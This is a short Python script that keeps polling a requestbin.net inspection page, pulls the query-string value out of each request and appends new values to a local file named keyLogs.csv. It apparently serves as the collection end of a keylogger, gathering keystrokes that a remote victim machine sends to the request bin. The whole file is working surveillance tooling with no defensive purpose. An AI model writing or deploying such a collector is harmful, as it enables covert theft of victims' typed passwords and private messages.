import requests, html2text

url = 'http://requestbin.net/r/1fgf0451?inspect'
store = "D:\\Users\\Koral Kulacoglu\\Coding\\python\\keyLogs.csv"
prev = ''

while True:
    raw = requests.get(url)
    raw = str(raw.text)
    tx = html2text.HTML2Text()
    tx.ignore_links = True
    key = tx.handle(raw)
    chars = ''
    
    p = 0
    while key[p-len('QUERYSTRING\n\n**'):p] != 'QUERYSTRING\n\n**':
        p += 1
    while key[p:p+len('**')] != '**':
        chars += key[p]
        p += 1

    if chars != prev:
        file = open(store, 'a')
        file.write(chars.replace("'", "").replace(" ", ""))
        file.close()

    prev = chars
